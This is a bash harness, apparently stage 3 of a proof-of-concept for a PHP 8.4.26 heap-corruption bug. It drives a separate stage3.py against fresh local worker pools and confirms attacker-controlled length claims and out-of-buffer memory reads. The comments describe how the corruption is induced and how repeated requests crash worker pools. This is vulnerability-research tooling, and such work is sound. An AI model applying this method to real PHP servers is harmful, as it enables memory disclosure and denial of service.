#!/usr/bin/env bash
# Stage 3 walkthrough: build the instrumented php, then measure against fresh
# worker pools.
#
# Why fresh pools, and why so many of them:
#
#   1. The control is only valid on a pool that has never served an OOM request.
#   2. The producer induces real heap corruption, and Zend's allocator answers with
#      `zend_mm_heap corrupted` + abort(), which takes every worker in the pool down
#      with it. A pool tolerates only a handful of corrupting requests -- measured
#      at about three -- before it dies.
#   3. Discovery costs producers too: claim and leak have to sweep the value-size
#      classes to find a shape that contains the stale pointer, because where it
#      lands depends on the pool's accumulated history.
#
# So control and containment get one pool each (containment *is* the sweep), while
# claim and leak get a fresh pool per rep. Running three reps inside one pool spent
# the pool's tolerance on rep 0 and reported "server died" for the rest, which looks
# exactly like the bug failing to reproduce.
#
# The process dying is a property of the thing being measured, not a fault in the
# harness: stage3.py reports it instead of tracebacking.
#
# Exits non-zero unless: the control is clean, containment is found, a length claim
# is adopted, AND an out-of-buffer read is confirmed.
#
# Usage: ./stage3.sh [--reps N] [--port N]
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
PORT="${PORT:-18627}"
REPS=3
VERSION=8.4.26
BUILD_DIR="${BUILD_DIR:-$HERE/build-instrumented}"
PHP="$BUILD_DIR/php-$VERSION/sapi/cli/php"
LOGDIR="$HERE/logs"
SRV=""

while [ $# -gt 0 ]; do
  case "$1" in
    --reps) REPS="$2"; shift 2 ;;
    --port) PORT="$2"; shift 2 ;;
    -h|--help) sed -n '2,30p' "$0"; exit 0 ;;
    *) echo "unknown argument: $1" >&2; exit 2 ;;
  esac
done

mkdir -p "$LOGDIR"

cleanup() {
  if [ -n "$SRV" ]; then kill "$SRV" 2>/dev/null || true; wait "$SRV" 2>/dev/null || true; fi
}
trap cleanup EXIT

if [ ! -x "$PHP" ]; then
  echo "==> instrumented build not found, building it (a few minutes)"
  BUILD_DIR="$BUILD_DIR" "$HERE/build-instrumented.sh"
fi

start_server() {
  local log="$1"
  if (exec 3<>/dev/tcp/127.0.0.1/"$PORT") 2>/dev/null; then
    exec 3>&- || true
    echo "port $PORT is already in use -- pass --port <n>" >&2
    exit 1
  fi
  : > "$log"
  PHP_CLI_SERVER_WORKERS=4 "$PHP" -d display_errors=1 -d error_reporting=E_ALL \
    -S 127.0.0.1:"$PORT" -t "$HERE/www" 2>"$log" &
  SRV=$!
  local i
  for i in $(seq 1 40); do
    if curl -sf -m 2 "http://127.0.0.1:$PORT/diag.php" >/dev/null 2>&1; then
      return 0
    fi
    sleep 0.25
  done
  echo "server did not come up -- see $log" >&2
  exit 1
}

stop_server() {
  [ -n "$SRV" ] || return 0
  kill "$SRV" 2>/dev/null || true
  wait "$SRV" 2>/dev/null || true
  SRV=""
}

# one mode, one fresh pool; echoes stage3.py's output
run_rep() {
  # separate statements: under `set -u` a `local` that references a variable it is
  # itself assigning in the same statement is not reliable.
  local mode="$1"
  local reps="$2"
  local log="$LOGDIR/instr-$mode.log"
  start_server "$log"
  local out
  out="$(python3 "$HERE/stage3.py" --port "$PORT" --log "$log" --reps "$reps" "$mode" 2>&1)" || true
  stop_server
  printf '%s\n' "$out"
}

result_of() {  # <stream> <mode> -> last RESULT value
  printf '%s\n' "$1" | grep -o "RESULT $2 [A-Z0-9]*" | awk '{print $3}' | tail -1
}

echo "======================================================================"
echo "=== mode: control  (one fresh pool, no producer)"
echo "======================================================================"
out="$(run_rep control 1)"
printf '%s\n' "$out"
CONTROL="$(result_of "$out" control)"
CONTROL="${CONTROL:-UNKNOWN}"
echo

echo "======================================================================"
echo "=== mode: containment  (one pool, sweeps every shape)"
echo "======================================================================"
out="$(run_rep containment "$REPS")"
printf '%s\n' "$out"
CONTAINMENT="$(result_of "$out" containment)"
CONTAINMENT="${CONTAINMENT:-0}"
echo

CLAIM=0
LEAK=0
for mode in claim leak; do
  echo "======================================================================"
  echo "=== mode: $mode  (a fresh pool per rep -- a pool survives about three"
  echo "===                  corrupting requests, and discovery spends some)"
  echo "======================================================================"
  total=0
  rep=1
  while [ "$rep" -le "$REPS" ]; do
    echo "--- $mode, rep $rep (fresh pool)"
    out="$(run_rep "$mode" 1)"
    printf '%s\n' "$out"
    n="$(result_of "$out" "$mode")"
    total=$(( total + ${n:-0} ))
    rep=$(( rep + 1 ))
    echo
  done
  echo "  $mode: $total of $REPS reps on fresh pools"
  echo "RESULT $mode $total"
  echo
  if [ "$mode" = "claim" ]; then CLAIM="$total"; else LEAK="$total"; fi
done

echo "======================================================================"
echo "VERDICT"
printf '  control clean (fresh pool, no producer) : %s\n' "$CONTROL"
printf '  containment shapes found                : %s\n' "$CONTAINMENT"
printf '  length claims adopted (of %s reps)       : %s\n' "$REPS" "$CLAIM"
printf '  out-of-buffer reads confirmed           : %s\n' "$LEAK"
echo

if [ "$CONTROL" = "OK" ] && [ "$CONTAINMENT" -gt 0 ] && [ "$CLAIM" -gt 0 ] && [ "$LEAK" -gt 0 ]; then
  echo "  PASS -- content, location and timing of the corrupted memory are all under"
  echo "  attacker control: the emitted length is decoupled from the buffer it is read"
  echo "  from, and the tail is memory this request never wrote."
  exit 0
fi

echo "  FAIL -- see the mode output above; logs are in $LOGDIR" >&2
if [ "$CONTROL" = "POISONED" ]; then
  echo "  (the control ran on a pool that had already served an OOM request)" >&2
fi
exit 1
